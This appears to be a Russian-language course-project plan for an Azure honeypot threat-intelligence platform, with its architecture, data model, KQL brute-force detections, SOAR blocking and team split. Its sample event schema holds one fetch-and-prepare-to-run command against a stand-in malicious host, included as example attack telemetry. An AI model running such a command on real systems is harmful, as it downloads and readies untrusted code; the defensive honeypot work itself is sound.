# HoneyGrid — Threat Intelligence Platform

## Финальный детальный план реализации (Azure · .NET · React)

Курсовой проект по Azure. Команда из 2 человек. Цель — оценка 5.

Распределённая threat-intelligence платформа: сеть honeypot-сенсоров в публичном интернете ловит реальные атаки → событийный конвейер обогащает, классифицирует через ИИ и стандартизирует в STIX 2.1 → SIEM (Sentinel) детектит паттерны и автоматически реагирует (SOAR) → React-дашборд в реальном времени показывает глобус атак, воспроизводит терминальные сессии злоумышленников и строит досье на «актёров угроз».

> Этот план объединяет два подхода: инженерную глубину (hub-and-spoke сеть, Private Link, DCR-ingestion, rate-based детекция, SOAR-автоблокировка, строгий STIX 2.1) и продуктовую часть (real-time через SignalR, 5 killer-фич, современный фронт-стек, равное деление на двоих).

---

## 1. Финальный список фич

### Базовый функционал

- Три типа honeypot-сенсоров (SSH/Telnet через Cowrie, Web на .NET, generic TCP/RDP)
- Стриминговый ingestion через Event Hub (миллионы событий/мин)
- Обогащение: GeoIP, ASN, reverse DNS, threat-intel reputation
- Нативная ingestion в Sentinel через **Data Collection Rules + Logs Ingestion API** (с KQL-трансформацией на лету)
- **Detection engineering**: rate-based KQL-правила (brute force, distributed, password spraying) с маппингом на MITRE ATT&CK
- **SOAR**: автоматическая митигация через Logic Apps (Teams Adaptive Card → авто-Deny в NSG → EDL)
- Real-time дашборд с живой лентой атак (SignalR)
- Ежедневный AI-брифинг на email

### 5 killer-фич на пятёрку

1. **Session Replay** — покадровое воспроизведение терминальной сессии атакующего через xterm.js из бинарных TTY-логов Cowrie. Видно ровно то, что злоумышленник печатал, с реальным таймингом.
2. **Live Attack Globe** — геопространственная карта атак (Azure Maps: heatmap + symbol-слои), опционально 3D-глобус с анимированными дугами в реальном времени.
3. **AI Threat Actor Profiling** — кластеризация атак по поведению в «актёров» + генерация досье каждого через Azure OpenAI (типаж, цели, kill-chain, уровень угрозы).
4. **STIX 2.1 / IoC Feed** — генерация индикаторов в индустриальном формате STIX с полноценным языком паттернов (`FOLLOWEDBY`, `WITHIN`, `REPEATS`), экспорт bundle.
5. **Credential Intelligence** — анализ перебираемых логинов/паролей, treemap, тренды, сопоставление с паттернами утечек.

---

## 2. Технологический стек

### Backend (C# / .NET 9)

| Технология                                 | Назначение                                                                   |
| ------------------------------------------ | ---------------------------------------------------------------------------- |
| ASP.NET Core 10 Web API                    | Backend дашборда (REST)                                                      |
| SignalR                                    | Real-time push событий на фронт                                              |
| .NET Worker Service (`IHostedService`)     | Непрерывный consumer Event Hub                                               |
| Azure Functions (.NET isolated)            | Event-driven обработка (AI classify, change-feed→SignalR, агрегаты)          |
| Azure SDK for .NET                         | Event Hubs, Blob, Service Bus, Cosmos, Monitor Ingestion                     |
| `System.Text.Json` + `Span<T>`/`Memory<T>` | Низкоаллокационная десериализация TTY/SCP-нагрузок (снижение нагрузки на GC) |
| MaxMind.GeoIP2                             | Offline GeoIP + ASN                                                          |
| Polly                                      | Retry / circuit breaker для OpenAI                                           |
| FluentValidation                           | Валидация контрактов                                                         |
| Serilog + OpenTelemetry                    | Структурные логи → Application Insights                                      |

### Frontend (React + TypeScript)

| Технология                            | Назначение                                    |
| ------------------------------------- | --------------------------------------------- |
| Vite + React 18.2 + TypeScript        | Каркас SPA                                    |
| Tailwind CSS v4                       | Стилизация (tree-shaking неиспользуемого CSS) |
| shadcn/ui (Radix)                     | Компонентная база                             |
| TanStack Query                        | Серверное состояние, кэш                      |
| Zustand                               | Клиентское состояние                          |
| @microsoft/signalr                    | Real-time клиент                              |
| azure-maps-control + react-azure-maps | Геокарта (heatmap + symbol слои, AAD-auth)    |
| react-globe.gl                        | 3D-глобус с дугами атак                       |
| @xterm/xterm                          | Плеер терминальных сессий (Session Replay)    |
| TanStack Virtual                      | Виртуализация живой ленты                     |
| Recharts + visx                       | Графики, treemap                              |
| d3-force                              | Граф кластеров актёров                        |
| Framer Motion                         | Анимации                                      |
| MSW (Mock Service Worker)             | Моки API для параллельной разработки          |

### Honeypot-сенсоры

- **Cowrie** — medium/high-interaction SSH+Telnet honeypot. Логирует словарные атаки, shell-команды, `exec` из SSH-запроса, скачанные через wget/SCP бинарники, и пишет бинарные TTY-логи для покадрового реплея.
- **Web honeypot** — собственный ASP.NET Core Minimal API, логирует все запросы к ловушечным путям (`/wp-login.php`, `/.env`, `/.git/config`, `/admin`), отдаёт правдоподобные приманки.
- **Generic TCP/RDP listener** — .NET-сервис, фиксирует попытки коннекта и handshake.

### Azure-сервисы

**Новые:** Microsoft Sentinel + Log Analytics, Event Hubs, Container Apps, Azure Maps, Azure OpenAI, Logic Apps, Communication Services, Data Collection Rules/Endpoint, Private Link, Key Vault, Application Insights, Container Registry, Static Web Apps.
**Знакомые:** Blob Storage, Azure Functions, Cosmos DB, Service Bus.

### DevOps

- Монорепо (GitHub), **Bicep** (IaC, модуль на сервис), **GitHub Actions** (CI/CD)
- **Managed Identity** + **Key Vault** — полностью бесключевая архитектура

---

## 3. Архитектура

```
                       Атакующие из интернета
                                │
        ┌───────── DMZ subnet (публичные IP) ─────────┐
        │  Container Apps:  Cowrie · Web HP · TCP HP    │
        │  NSG: inbound разрешён, outbound — только     │
        │       телеметрия (анти-pivot/анти-DDoS)       │
        └───────────────────┬───────────────────────────┘
                            │ JSON + TTY
                            ▼
                       Event Hub  ◄── (publish/subscribe буфер)
                            │
        ┌─── Logic subnet (без публичных IP) ───┐
        │  .NET Worker Service (IHostedService)  │
        │  enrich: GeoIP · ASN · rDNS · intel    │
        └───────┬─────────────┬─────────┬─────────┘
                │             │         │
   DCR + Logs   │      Cosmos │   Blob  │  Service Bus
   Ingestion API│      (hot)  │(payloads)│      │
        ▼       │             │         │       ▼
   Log Analytics│             │         │  AI Classifier (OpenAI)
   + Sentinel   │             │◄────────┼──── kill-chain + score
        │       │     Change Feed       │       │
   ┌────┴────┐  │      → SignalR        │   STIX 2.1 gen
   │ KQL     │  │          │            │       │
   │ rules   │  │          ▼            ▼       ▼
   │ Workbook│  │   ASP.NET Core API + SignalR Hub
   └────┬────┘  │              │
   SOAR (Logic  │              ▼
   Apps): Teams │   ┌──────────────────────────────┐
   card → NSG   │   │ React SPA (Static Web App)     │
   Deny → EDL   │   │ Globe · Live feed · Replay ·   │
        │       │   │ Actors · STIX feed · Creds     │
        ▼       │   └──────────────────────────────┘
   авто-блок IP │
                └─ Data subnet (Private Link к Cosmos/Event Hub/Blob)

   Timer → Logic Apps → OpenAI → Communication Services (daily briefing)
```

**Ключевые решения:**

- **Hub-and-spoke с 3 подсетями** (DMZ / logic / data) + Private Link к PaaS — скомпрометированный сенсор не даёт pivot к аналитике.
- **Event Hub** для ingestion (high-volume), **Service Bus** как буфер перед OpenAI (батчинг, экономия токенов).
- **Два пути телеметрии параллельно**: DCR → Sentinel (SIEM-аналитика, детекция, SOAR) и Event Hub → Cosmos → Change Feed → SignalR (low-latency realtime для UI).

---

## 4. Сетевая архитектура и безопасность (Bicep)

### Топология hub-and-spoke

| Подсеть   | Содержимое                          | NSG / доступ                                                                                                |
| --------- | ----------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| **DMZ**   | Container Apps с honeypot-сенсорами | Inbound из интернета на порты-приманки; **outbound заблокирован**, кроме телеметрии (анти-pivot, анти-DDoS) |
| **Logic** | C# микросервисы (Worker, API)       | Без публичных IP; общается с data-слоем только через Private Link                                           |
| **Data**  | Event Hub, Cosmos DB, Blob          | Доступ только через **Azure Private Link**, без выхода в публичный интернет                                 |

### Матрица RBAC (бесключевая, Managed Identity, least-privilege)

| Роль Azure                                | Назначение                                               | Кому                      |
| ----------------------------------------- | -------------------------------------------------------- | ------------------------- |
| Monitoring Metrics Publisher              | C#-приложению отправлять данные через Logs Ingestion API | DCR / Log Analytics       |
| Microsoft Sentinel Contributor            | Привязка автоматизации/Playbook к правилам               | Sentinel                  |
| Microsoft Sentinel Automation Contributor | Sentinel-у запускать Playbooks в RG                      | Resource Group            |
| Logic App Contributor                     | Управление/запуск Consumption-playbook                   | Logic Apps                |
| Microsoft Sentinel Responder              | Playbook обновляет статус инцидента                      | Playbook Managed Identity |
| Network Contributor                       | Playbook вписывает Deny-правило в NSG                    | Playbook → NSG            |

Все API ingestion требуют TLS ≥ 1.2.

---

## 5. Модель данных

### Event schema (контракт между сенсорами и конвейером — общий NuGet `HoneyGrid.Contracts`)

```json
{
  "id": "guid",
  "attackerIp": "203.0.113.45",
  "sensorId": "ssh-eu-01",
  "sensorType": "ssh | web | rdp",
  "timestamp": "2026-06-10T14:23:01Z",
  "eventType": "login.failed | login.success | command | http.request | connect",
  "sessionId": "cowrie-session-guid",
  "geo": {
    "country": "VN",
    "countryName": "Vietnam",
    "city": "Hanoi",
    "lat": 21.02,
    "lon": 105.84,
    "asn": "AS7552",
    "org": "Viettel"
  },
  "credentials": { "username": "root", "password": "123456" },
  "command": "wget http://malicious.example/x.sh; chmod +x x.sh",
  "downloadHash": "sha256:...",
  "http": { "method": "GET", "path": "/wp-login.php", "userAgent": "..." },
  "threatIntel": {
    "knownMalicious": true,
    "sources": ["AbuseIPDB"],
    "score": 87
  },
  "classification": {
    "killChainPhase": "delivery",
    "category": "mirai_botnet",
    "sophistication": 0.3,
    "intent": "cryptominer",
    "actorId": "actor-0047"
  },
  "ttyRef": "blob://tty/2026/06/10/<session>.bin",
  "rawRef": "blob://raw/2026/06/10/ssh-eu-01/....json"
}
```

### Cosmos DB контейнеры

| Контейнер    | Partition key | TTL      | Назначение                                                                                   |
| ------------ | ------------- | -------- | -------------------------------------------------------------------------------------------- |
| `events`     | `/attackerIp` | 180 дней | Нормализованные события. PK по IP исключает fan-out при профилировании актёра, экономит RU/s |
| `actors`     | `/id`         | ∞        | Профили threat-актёров (досье от ИИ)                                                         |
| `sessions`   | `/sessionId`  | 180 дней | Метаданные сессий + ссылка на TTY в Blob                                                     |
| `iocs`       | `/type`       | ∞        | STIX-индикаторы                                                                              |
| `aggregates` | `/bucket`     | 30 дней  | Предрассчитанные агрегаты для дашборда                                                       |

- **TTL** автоматически чистит сырую телеметрию, оставляя индикаторы и результаты моделей.
- **Blob**: `raw/` (audit JSON), `tty/` (бинарные сессии для реплея), `downloads/` (скачанные атакующими бинарники, через Azure Files SMB-persistence Cowrie).

---

## 6. Конвейер по компонентам

### 6.1 Cowrie-сенсоры (fingerprint-evasion + persistence)

| Файл                         | Роль               | Оптимизация                                                                            |
| ---------------------------- | ------------------ | -------------------------------------------------------------------------------------- |
| `etc/cowrie.cfg`             | Главный конфиг     | Подмена баннеров сервера, hostname, фейкового FS — чтобы honeypot не палился сканерами |
| `etc/userdb.txt`             | Словарь кредов     | Разрешить отдельные пары user/pass для входа → изучать post-exploitation фазу          |
| `var/log/cowrie/cowrie.json` | JSON-логи          | Источник телеметрии для C#, парсинг без regex                                          |
| `var/lib/cowrie/tty/`        | Бинарные TTY-дампы | Формат UML → покадровый реплей в xterm.js                                              |
| `src/cowrie/data/fs.pickle`  | Виртуальный FS     | Метаданные для эмуляции `cat /etc/passwd` и т.п.                                       |

- Деплой в Container Apps; маппинг публичного 22 → 2222 внутри контейнера.
- Persistence stateful-данных через **Azure Files (SMB)** — скачанные `downloads/` сохраняются для статического анализа.

### 6.2 Web honeypot (.NET)

```csharp
app.MapFallback(async (HttpContext ctx) => {
    var evt = new HoneypotEvent {
        SensorType = "web",
        AttackerIp = ctx.Connection.RemoteIpAddress?.ToString(),
        Http = new HttpInfo { Method = ctx.Request.Method, Path = ctx.Request.Path,
                              UserAgent = ctx.Request.Headers.UserAgent },
        EventType = "http.request", Timestamp = DateTime.UtcNow
    };
    await ShipToEventHub(producer, evt);
    return Results.Content(FakeLoginPage(ctx.Request.Path), "text/html"); // приманка
});
```

### 6.3 Ingestion + Enrichment (.NET Worker Service)

- `IHostedService`, непрерывный async-consumer Event Hub.
- Десериализация через `Span<T>`/`Memory<T>` — минимум аллокаций на больших TTY/SCP-нагрузках.
- Обогащение: GeoIP+ASN (MaxMind offline), rDNS, threat-intel (AbuseIPDB, кэшируется — один IP бьёт много раз).
- Фан-аут: Cosmos (hot) + Blob (raw/tty/downloads) + DCR→Log Analytics + Service Bus→AI.

### 6.4 Нативная ingestion в Sentinel (DCR + Logs Ingestion API)

Вместо тяжёлых агентов — прямой ingestion через **Data Collection Rules** (kind `Direct`):

1. **Stream Declarations** — строгая типизация полей (`string`, `datetime`, `dynamic`) для `Custom-CowrieStream`.
2. **Ingestion-time KQL transforms** — фильтрация/обогащение/отбрасывание шума ещё до записи (экономия на хранении).
3. **Data Flows → Destinations** — в кастомную таблицу `Cowrie_CL` в Log Analytics Workspace.

C#-сервис в logic-подсети аутентифицируется через Managed Identity и шлёт сгруппированные JSON-батчи на Data Collection Endpoint (TLS 1.2+).

### 6.5 Detection engineering (Sentinel KQL)

Per-event алерты дают alert fatigue (Hydra генерит >260 ошибок за 30 мин). Решение — **rate-based detection** с `bin()`:

```kql
Cowrie_CL
| where SyslogMessage has "Failed password" or SyslogMessage has "authentication failure"
| parse kind=relaxed SyslogMessage with * "invalid user " user " from " ip " port" *
| summarize FailedAttempts = count() by ip, bin(TimeGenerated, 5m)
| where FailedAttempts > 15
```

| Паттерн                | Логика KQL                                                 | MITRE     |
| ---------------------- | ---------------------------------------------------------- | --------- |
| Brute Force            | `count()` по одному IP в `bin(5m)`, threshold              | T1110.001 |
| Distributed BF         | `dcount(ip)` против одного логина в длинном окне           | T1110.001 |
| Password Spraying      | `dcount(Username)` против одного IP (мало попыток/аккаунт) | T1110.003 |
| Success After Failures | успешный логин после волны ошибок → **High severity**      | T1078     |

Плюс **Entity Mapping** (IP/Host в инциденте — для автоматизации) и **Sentinel Workbook** для «взрослой» визуализации.

### 6.6 SOAR — автоматическая митигация (Logic Apps Playbook)

Триггерится правилом Sentinel, MTTR → миллисекунды:

1. **Teams Adaptive Card** — синхронная нотификация SOC-аналитику с кнопками Block/Ignore.
2. **NSG авто-Deny** — REST-инъекция правила `Deny / Inbound / Source = attacker IP` наверх NSG.
3. **EDL Manager** — рассылка IP в External Dynamic List → блок на периметровых firewalls (напр. Palo Alto PAN-OS) во всей гибридной сети.

### 6.7 AI Classification (Azure OpenAI, Service Bus trigger)

Батч из Service Bus (по 50 событий — экономия токенов), строгий JSON-ответ:

```csharp
var prompt = $$"""
Ты — SOC-аналитик. Для каждого события классифицируй:
- killChainPhase (recon|weaponization|delivery|exploitation|installation|c2|actions)
- category, sophistication (0-1), intent (1 фраза), confidence (0-1).
Отвечай ТОЛЬКО валидным JSON-массивом, без markdown.
События: {{JsonSerializer.Serialize(batch)}}
""";
var classified = ParseJsonSafe(await _openAi.GetChatCompletionAsync(prompt)); // gpt-4o-mini
await _cosmos.PatchClassificationsAsync(classified); // Polly retry
```

### 6.8 STIX 2.1 generation

C#-классы, строго совпадающие со словарём STIX. SDO заворачиваются в `Bundle`:

| STIX-объект      | Атрибуты                                              | Роль                                     |
| ---------------- | ----------------------------------------------------- | ---------------------------------------- |
| `identity`       | spec_version, name, identity_class                    | Идентичность платформы-аудитора          |
| `indicator`      | pattern_type=`stix`, pattern, valid_from              | Правило детекции (вредоносные креды/хэш) |
| `attack-pattern` | name, external_references                             | Маппинг формы атаки на MITRE CAPEC       |
| `relationship`   | relationship_type=`indicates`, source_ref, target_ref | Граф: indicator → attack-pattern         |

Язык паттернов STIX:

```
[ipv4-addr:value = '203.0.113.45'] FOLLOWEDBY [user-account:account_login = 'admin'] WITHIN 1 MINUTE
([ipv4-addr:value='...'] FOLLOWEDBY [ipv4-addr:value='...']) REPEATS 5 TIMES
[file:hashes.'SHA-256' = '<dropper-hash>']
```

Эндпоинт `/api/iocs/stix` отдаёт валидный bundle (проверять STIX 2 Pattern Validator).

### 6.9 API + SignalR + realtime

```
GET  /api/feed?since=&take=      историческая/живая лента (пагинация)
GET  /api/stats/{overview|geo|credentials}
GET  /api/actors  ·  /api/actors/{id}
GET  /api/sessions/{id}/replay   TTY-данные для xterm
GET  /api/iocs/stix              STIX bundle
hub  AttackHub                   realtime push
```

- **Cosmos Change Feed → Function → `hub.Clients.All.SendAsync("attack", evt)`** — каждое новое событие мгновенно на дашборде.
- Серверный throttle (окно ~250мс) при пиках, output caching на агрегатах, Brotli.

---

## 7. Killer-фичи детально

**Session Replay** — парсер бинарных TTY (формат UML) → asciicast-таймлайн в Blob → xterm.js в readonly-режиме, parser hooks (`registerCsiHandler`/`registerDcsHandler`) разбивают поток на временные сегменты, рендер с оконным дебаунсом (минимум нагрузки на GPU/main-thread). Play/pause/speed. _Caveat: отключить `React.StrictMode`, иначе двойной рендер ломает геометрию терминала._

**Live Attack Globe** — Azure Maps Web SDK через `react-azure-maps` (Context API: `AzureMapsProvider`/`DataSourceProvider`/`LayerProvider`), AAD-auth (без анонимных ключей в коде), `SymbolLayer` + `HeatMapLayer` по гео-координатам. Realtime-апдейты из SignalR. Опционально — вкладка 3D-глобуса (react-globe.gl) с анимированными дугами атак (цвет = категория, ≤150 активных дуг для WebGL-производительности).

**AI Threat Actor Profiling** — fingerprint сессии (порядок команд, тайминг, тулзы, креды, ASN) → similarity-кластеризация в `actors` → OpenAI пишет досье (типаж, цели, активность по времени, уровень угрозы). Фронт: граф на d3-force (узел = актёр, размер = число атак) → клик → карточка-досье.

**STIX 2.1 / IoC Feed** — см. 6.8. Фронт: список IoC, фильтры, экспорт bundle.

**Credential Intelligence** — агрегация всех user/pass попыток, treemap (visx), тренды, доля совпадений с топ-паттернами утечек, инсайт-карточки.

---

## 8. РАЗДЕЛЕНИЕ НА 2 РАВНЫЕ ЧАСТИ

Деление по принципу реального SOC: **Detection & Response Engineer** (синяя команда) vs **Threat Intelligence & Experience Engineer** (CTI-аналитик). Каждый делает: IaC (Bicep) + C# backend + несколько Azure-сервисов + работу с Azure OpenAI + фронтенд-модуль на React/Tailwind + минимум 2 killer-фичи. Нагрузка симметрична, и благодаря контрактам (см. §8.3) оба работают параллельно с первой недели.

### 8.1 Track A — Sensors, Detection & Response (Человек 1)

**IaC / сеть:** network & security plane — VNet hub-spoke, 3 подсети, NSG, Private Link, RBAC-матрица, Key Vault.
**Backend / Azure:**

- Cowrie SSH/Telnet (конфиг, fingerprint-evasion, userdb, fs.pickle, Azure Files persistence, TTY+JSON логи)
- Web honeypot (.NET) + generic TCP listener
- Event Hub + producer-сторона контракта
- Ingestion + Enrichment Worker Service (`IHostedService`, `Span<T>`, GeoIP/ASN/rDNS/intel)
- DCR + Logs Ingestion API → Log Analytics (`_CL`, ingestion-time KQL)
- Sentinel: rate-based KQL-правила, entity mapping, MITRE; Workbook
- **SOAR Playbooks** (Logic Apps): Teams card → NSG Deny → EDL
- **STIX 2.1 generation engine** (.NET SDO-классы, Bundle, pattern language) + `/api/iocs/stix`

**Azure OpenAI:** промпт kill-chain → STIX-indicator (генерация паттернов).
**Killer-фичи:** ① Session Replay (TTY-парсер + xterm.js плеер) · ④ STIX 2.1 / IoC Feed.
**Frontend (SOC / Investigation модуль):** страница инцидента, Session Replay viewer, таблицы детекций, таймлайн SOAR-действий, IoC-feed UI с экспортом.

### 8.2 Track B — Intelligence, API & Experience (Человек 2)

**IaC / приложение:** application & data plane — Container Apps (API), Cosmos (partition+TTL), Blob, Service Bus, Azure OpenAI, Static Web App, Application Insights.
**Backend / Azure:**

- Cosmos data model + Change Feed processor
- **AI Classification** (Azure OpenAI: kill-chain, sophistication, intent) через Service Bus буфер
- ASP.NET Core API + SignalR Hub + Change Feed → SignalR realtime
- Daily AI briefing (Logic Apps + Communication Services)
- Observability (App Insights, OpenTelemetry через весь конвейер)

**Azure OpenAI:** классификация + досье актёров + брифинг.
**Killer-фичи:** ② Live Attack Globe (Azure Maps + опц. 3D) · ③ AI Threat Actor Profiling · ⑤ Credential Intelligence.
**Frontend (Dashboard модуль + foundation):** каркас (Vite/Tailwind/shadcn/routing/тема — общий, B скаффолдит), главный дашборд, глобус, виртуализированная живая лента, графики, граф актёров (d3-force), treemap кредов.

### 8.3 Контракты и стратегия параллельной работы

**Неделя 0 (совместно, 2-3 дня):** монорепо, NuGet `HoneyGrid.Contracts` (event schema), Cosmos-контейнеры + PK, Bicep-скелет, дизайн-система, OpenAPI-контракт API.

Три контракта-границы развязывают зависимости:

- **Event schema** (общий NuGet) — A пишет producer, B читает consumer.
- **OpenAPI** — фронт обоих кодируется против контракта с **MSW-моками**, не дожидаясь backend.
- **Cosmos `events.classification`** — A's STIX/SOAR зависят от B's классификации; B сразу отдаёт **stub-классификатор** (фикс-категория), A не блокируется.

Взаимные фикстуры: A даёт B примеры `cowrie.json` + TTY-дампы; B даёт A mock-классификации. Так оба пишут код одновременно с первого дня.

### 8.4 Баланс (проверка равенства)

| Критерий                        | A                             | B                                      |
| ------------------------------- | ----------------------------- | -------------------------------------- |
| IaC (Bicep)                     | сеть+безопасность             | приложение+данные                      |
| C# backend-компоненты           | 6                             | 5                                      |
| Azure-сервисов в зоне ответств. | ~8                            | ~8                                     |
| Работа с Azure OpenAI           | STIX-генерация                | классификация, профилирование, брифинг |
| Killer-фичи                     | 2                             | 3 (одна лёгкая)                        |
| Фронтенд-модуль                 | SOC/Investigation             | Dashboard + foundation                 |
| Тяжёлые узлы                    | SOAR, detection eng., сенсоры | API+SignalR+realtime, globe            |

---

## 9. Таймлайн (8 недель, параллельно)

| Нед. | Track A (Detection & Response)                                                | Track B (Intelligence & Experience)                |
| ---- | ----------------------------------------------------------------------------- | -------------------------------------------------- |
| 0    | **Совместно:** репо, Contracts, Cosmos, Bicep-скелет, дизайн-система, OpenAPI |                                                    |
| 1    | Bicep сеть (hub-spoke, NSG, Private Link, RBAC)                               | Bicep app/data + Cosmos + API-скелет + SignalR Hub |
| 2    | Cowrie + Web HP → Event Hub                                                   | Change Feed → SignalR + живая лента (на моках)     |
| 3    | Enrichment Worker (GeoIP/ASN/intel)                                           | AI Classifier (Service Bus + OpenAI) + stub        |
| 4    | DCR + Logs Ingestion → Sentinel                                               | Live Globe (Azure Maps)                            |
| 5    | KQL detection rules + Workbook                                                | Threat Actor Profiling (кластеры + досье)          |
| 6    | SOAR Playbook (Teams/NSG/EDL)                                                 | Credential Intelligence + Daily briefing           |
| 7    | Session Replay (TTY → xterm.js) + IoC UI                                      | Globe 3D + графики + observability                 |
| 8    | **Совместно:** интеграция, оптимизация, метрики, репетиция демо               |                                                    |

Сенсоры задеплоить как можно раньше — к защите накопятся реальные данные.

---

## 10. DevOps / IaC / CI-CD

```
/src
  /HoneyGrid.Contracts     (shared models, NuGet)
  /HoneyGrid.Sensors       (Web HP, TCP listener)
  /HoneyGrid.Ingestion     (Worker Service)
  /HoneyGrid.Functions     (AI classify, change-feed→signalr, aggregates)
  /HoneyGrid.Stix          (STIX 2.1 engine)
  /HoneyGrid.Api           (ASP.NET Core + SignalR)
  /HoneyGrid.Web           (React + Vite + Tailwind)
/infra/bicep               (модуль на сервис: network, data, app, sentinel, ai)
/.github/workflows         (build → test → deploy)
```

- Bicep параметризован по окружениям (`dev`/`prod`).
- GitHub Actions: build + unit-тесты → деплой в Container Apps/Functions/Static Web Apps.
- Секреты (OpenAI, AbuseIPDB) — в Key Vault, доступ через Managed Identity.

---

## 11. Оптимизация

**Backend:** async везде; Cosmos point-read по PK, батч-патчи; OpenAI батчинг по 50 + gpt-4o-mini + Polly; Service Bus prefetch; `Span<T>`/`Memory<T>` для GC; ingestion-time KQL отбрасывает шум до записи (экономия Log Analytics); output caching; Brotli; SignalR throttle 250мс.

**Frontend:** code splitting + `React.lazy` для глобуса/терминала; TanStack Virtual для ленты; дебаунс фильтров, мемоизация; SignalR backpressure через `requestAnimationFrame`; Tailwind tree-shaking; Lighthouse-бюджет.

**Стоимость (Azure for Students $100):** Container Apps scale-to-zero, Event Hub Basic, Cosmos serverless + TTL, Log Analytics/Sentinel free до 5GB/день, gpt-4o-mini+батчинг (~$, центы), Static Web Apps free, Azure Maps free до 1000 рендеров. Гасить ресурсы между демо.

---

## 12. Метрики и тестирование (академическая калибровка)

Стресс-тест: десятки тысяч одновременных скан-процессов (напр. THC Hydra) против сенсоров. Измеряемые показатели:

- **MTTD** (Mean Time To Detect) — минимизирован за счёт отсутствия тяжёлых агентов, всё в Event Hub/cloud.
- **MTTR** (Mean Time To Respond) — SOAR доводит до миллисекунд (один HTTP PUT в NSG/EDL).
- **Latency** — `bin()`-агрегация сворачивает 260 событий в один инцидент, снимая нагрузку с C# и затрат Sentinel.
- **TP/FP** — rate-based детекция + ingestion-time фильтрация снижают ложные срабатывания.
- **STIX-валидность** — 100% синтаксическое соответствие STIX 2 Pattern Validator (нет «галлюцинаций» LLM).

---

## 13. Безопасность и этика

- Отдельная RG/VNet, без peering; NSG outbound-блок на сенсорах (анти-pivot/DDoS); лимит исходящего трафика.
- Только официальные образы (Cowrie); Managed Identity least-privilege.
- В отчёте: что собираете и зачем (атаки на свои же ресурсы — легально), что не публикуете (PII), retention (детали 180 дней, агрегаты дольше). Зрелый этический раздел повышает оценку.

---

## 14. План демо на защиту

1. **Глобус** — живые дуги/heatmap атак за час.
2. **Session Replay** — воспроизвести реальную сессию бота (момент-убийца).
3. **Threat Actor** — досье кластера от ИИ + граф.
4. **Sentinel** — rate-based правило ловит волну Hydra → один инцидент; **SOAR** автоматически блокирует IP в NSG (показать правило до/после).
5. **Credential Intelligence** — топ паролей (`admin/admin`, `root/123456`).
6. **STIX feed** — экспорт валидного bundle.
7. **Live-демо** — открыть новый порт (Telnet/23) прямо во время защиты → через 5-10 мин первые попытки входа в реалтайме на глобусе.

---

## 15. Чеклист «на 5»

- [ ] Hub-and-spoke сеть + Private Link + бесключевая RBAC-матрица
- [ ] ≥5 новых Azure-сервисов помимо базовых
- [ ] Event-driven архитектура (Event Hub → enrich → Service Bus → AI)
- [ ] DCR + Logs Ingestion API с ingestion-time KQL
- [ ] Rate-based detection (3 паттерна) + MITRE ATT&CK + entity mapping
- [ ] SOAR с реальной авто-митигацией (NSG/EDL)
- [ ] STIX 2.1 с языком паттернов (FOLLOWEDBY/WITHIN/REPEATS), валидно
- [ ] Real-time через SignalR (Change Feed)
- [ ] 5 killer-фич реализованы
- [ ] Реальные данные (не симуляция) на защите
- [ ] IaC (Bicep) + CI/CD + observability (App Insights/OTel)
- [ ] Красивый отзывчивый UI (Tailwind + shadcn, тёмная тема, анимации)
- [ ] Оптимизация задокументирована + метрики MTTD/MTTR/TP-FP
- [ ] Архитектурная диаграмма + этический раздел
- [ ] Равное и осмысленное деление на двоих с контрактами для параллельной работы
